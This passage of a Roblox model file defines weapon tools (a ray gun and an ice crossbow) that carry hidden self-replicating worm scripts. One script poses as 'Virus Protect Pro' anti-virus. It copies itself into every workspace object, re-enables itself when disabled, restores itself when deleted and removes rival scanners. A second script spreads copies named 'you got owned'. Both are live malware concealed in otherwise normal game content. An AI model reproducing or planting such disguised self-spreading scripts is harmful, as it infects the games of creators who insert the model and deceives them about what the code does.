		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX248">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>-1</Y>
					<Z>-0.300000012</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>-0</R02>
					<R10>0</R10>
					<R11>0</R11>
					<R12>-1</R12>
					<R20>0</R20>
					<R21>1</R21>
					<R22>-0</R22>
				</CoordinateFrame>
				<string name="Name">RayGun2</string>
				<Content name="TextureId"><url>http://www.roblox.com/asset/?id=18267658</url></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX249">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">LaserBlast</string>
					<ProtectedString name="Source">ball = script.Parent
damage = 10

HitSound = Instance.new(&quot;Sound&quot;)
HitSound.Name = &quot;HitSound&quot;
HitSound.SoundId = &quot;http://www.roblox.com/asset/?id=13775466&quot;
HitSound.Parent = ball
HitSound.Volume = 1



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid:TakeDamage(damage)
		untagHumanoid(humanoid)
	end

	HitSound:Play()
	ball.Parent = nil

end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(5)
--ball.SparkSound.Looped = false
--ball.SparkSound:Stop()
ball.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX250">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">RayGun</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true

local spark = Instance.new(&quot;Sparkles&quot;)
spark.Color = Color3.new(0,1,1)

function fire(v)

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

	
	spark:Clone().Parent = missile

	local spawnPos = vCharacter.PrimaryPart.Position
	
	local PewPew = Tool.Handle:FindFirstChild(&quot;PewPew&quot;)

	if (PewPew == nil) then
		PewPew = Instance.new(&quot;Sound&quot;)
		PewPew.Name = &quot;PewPew&quot;
		PewPew.SoundId = &quot;http://www.roblox.com/asset/?id=16433315&quot;
		PewPew.Parent = Tool.Handle
		PewPew.Volume = 1
	end
	

	spawnPos  = spawnPos + (v * 10)

	
	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 200
	missile.BrickColor = BrickColor.new(1020)
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Spark&quot;
	missile.Reflectance = .5


	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,98,0)
	force.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	
	local new_script = script.Parent.LaserBlast:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	missile.Parent = game.Workspace

	PewPew:Play()

end



function gunUp()
	Tool.GripForward = Vector3.new(0,.981,-.196)
	Tool.GripRight = Vector3.new(1,0,0)
	Tool.GripUp = Vector3.new(0,.196,.981)
end

function gunOut()
	Tool.GripForward = Vector3.new(0,1,0)
	Tool.GripRight = Vector3.new(1,0,0)
	Tool.GripUp = Vector3.new(0,0,1)
end

function isTurbo(character)
	return character:FindFirstChild(&quot;BoltHelm&quot;) ~= nil
end


function onActivated()
	if not enabled  then
		return
	end

	enabled = false


	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit

	local reload = .1
	--if (isTurbo(character)) then
	--	reload = .25
	--	print(&quot;turbo&quot;)
	--end

	gunUp()
	fire(lookAt)
	wait(reload)
	gunOut()
	wait(reload)

	enabled = true

end

function onEquipped()
	Tool.Handle.EquipSound:play()
end

script.Parent.Activated:connect(onActivated)
script.Parent.Equipped:connect(onEquipped)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX251">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = false
	mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;

	wait(.2)
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX252">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX253">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="VelocityMotor" referent="RBX254">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Weld" referent="RBX255">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX256">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX257">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>-0.600000024</Y>
					<Z>0</Z>
					<R00>-0.999944031</R00>
					<R01>-5.51959893e-005</R01>
					<R02>-0.0105792647</R02>
					<R10>0</R10>
					<R11>0.99998641</R11>
					<R12>-0.00521730399</R12>
					<R20>0.0105794081</R20>
					<R21>-0.00521701202</R21>
					<R22>-0.999930441</R22>
				</CoordinateFrame>
				<string name="Name">Ice CrossBow</string>
				<Content name="TextureId"><url>http://www.roblox.com/asset/?id=16215840 </url></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="SpecialMesh" referent="RBX258">
				<Properties>
					<token name="LODX">2</token>
					<token name="LODY">2</token>
					<Content name="MeshId"><null></null></Content>
					<token name="MeshType">0</token>
					<string name="Name">Mesh</string>
					<Vector3 name="Offset">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
					</Vector3>
					<Vector3 name="Scale">
						<X>0.5</X>
						<Y>1</Y>
						<Z>0.5</Z>
					</Vector3>
					<Content name="TextureId"><null></null></Content>
					<Vector3 name="VertexColor">
						<X>1</X>
						<Y>1</Y>
						<Z>1</Z>
					</Vector3>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX259">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">CrossbowBoltScript</string>
					<ProtectedString name="Source">debris = game:GetService(&quot;Debris&quot;)
bolt = script.Parent
damage = 99

debris:AddItem(bolt, 20)

function stick(hit)
	-- joint myself to the thing i hit

	local weld = Instance.new(&quot;Weld&quot;)

	weld.Part0 = bolt
	weld.Part1 = hit


	local HitPos = bolt.Position + (bolt.Velocity.unit * 3)   -- + (arrow.CFrame.lookVector * 1)

	local CJ = CFrame.new(HitPos)
	local C0 = bolt.CFrame:inverse() *CJ
	local C1 = hit.CFrame:inverse() * CJ
	
	weld.C0 = C0
	weld.C1 = C1

	weld.Parent = bolt

end

function onTouched(hit)

	bolt.BodyGyro:remove()
	bolt.BodyForce:remove()

	stick(hit)

	bolt.HitSound:Play()

	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)


	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid.Health = humanoid.Health - damage
	end
	connection:disconnect()
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = bolt:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
		debris:AddItem(new_tag,1)
	end
end



connection = bolt.Touched:connect(onTouched)

for i=1,100 do
	wait(.1 * i)
	if (bolt:FindFirstChild(&quot;BodyGyro&quot;) ~= nil) then
		bolt.BodyGyro.cframe = CFrame.new(Vector3.new(0,0,0), -bolt.Velocity.unit)
	end
end


</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX260">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">WeldScript</string>
					<ProtectedString name="Source">w2 = Instance.new(&quot;Weld&quot;)
w2.Name = &quot;BoltWeld&quot; 
w2.Parent = script.Parent.Handle 
w2.Part0 = script.Parent.Handle 
w2.Part1 = script.Parent.Bolt 
w2.C1 = CFrame.new(0,-.35,-1.6)

</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX261">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then return end
	script.Parent.Bolt.Transparency = 1
	enabled = false
	mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;

	wait(2)
	script.Parent.Bolt.Transparency =  0
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX262">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">CrossbowLauncher</string>
					<ProtectedString name="Source">Tool = script.Parent


function fire(v)


	local vCharacter = Tool.Parent

	local vPlayer = game.Players:playerFromCharacter(vCharacter)
	Tool.Parent.Torso[&quot;Right Shoulder&quot;].DesiredAngle = 3			--moves your arm as if firing.

	local missile = Tool.Bolt:Clone()

	-- find firing direction

	local v1 = -Tool.Bolt.CFrame.lookVector.unit
	local v2 = v.unit
	

	local dot = (v1.x * v2.x) + (v1.y * v2.y) + (v1.z * v2.z)
	local ang = math.acos(dot)

	-- test if in cone
	if (ang &lt; 3.14 / 8) then

	else
		-- not in cone, find projection
		-- n = v1 x v2
		--local n = Vector3.new(v1.y * v2.z - v1.z * v2.y, v1.z * v2.x - v1.x * v2.z, v1.z * v2.y - v1.y * v2.x)

		--return
	end

	

	

	
	--missile.CFrame = Tool.Bolt.CFrame + (Tool.Bolt.CFrame.lookVector * -8)
	missile.CFrame = Tool.Bolt.CFrame + (v * 8)

	missile.Transparency = 0

	missile.Velocity =  v * 40

	missile.Name = &quot;CrossbowBolt&quot;

	missile.Elasticity = 0


	local force = Instance.new(&quot;BodyForce&quot;)

	force.force = Vector3.new(0,150,0)

	force.Parent = missile

	missile.BodyGyro.cframe = CFrame.new(Vector3.new(0,0,0), -Tool.Bolt.CFrame.lookVector.unit)
	missile.BodyGyro.maxTorque = Vector3.new(5e5,5e5,5e5)



	local new_script = script.Parent.CrossbowBoltScript:clone()

	new_script.Disabled = false

	new_script.Parent = missile



	local creator_tag = Instance.new(&quot;ObjectValue&quot;)

	creator_tag.Value = vPlayer

	creator_tag.Name = &quot;creator&quot;

	creator_tag.Parent = missile

	
	missile.Parent = game.Workspace



end







Tool.Enabled = true

function onActivated()


	if not Tool.Enabled then

		return

	end


	Tool.Enabled = false

	local character = Tool.Parent;

	local humanoid = character.Humanoid

	if humanoid == nil then

		print(&quot;Humanoid not found&quot;)

		return 

	end

	local targetPos = humanoid.TargetPoint

	local lookAt = (targetPos - character.Head.Position).unit

	Tool.Handle.FireSound:Play()

	fire(lookAt)

	wait(2)

	Tool.Enabled = true

end




script.Parent.Activated:connect(onActivated)



</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="RotateP" referent="RBX263">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX264">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="VelocityMotor" referent="RBX265">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="RotateV" referent="RBX266">
					<Properties>
						<float name="BaseAngle">3.91840415e-031</float>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX267">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="Geometry" referent="RBX268">
			<Properties>
				<string name="Name">ViVRuS</string>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Timer" referent="RBX269">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX270">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">AntiVirusSoftware</string>
						<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
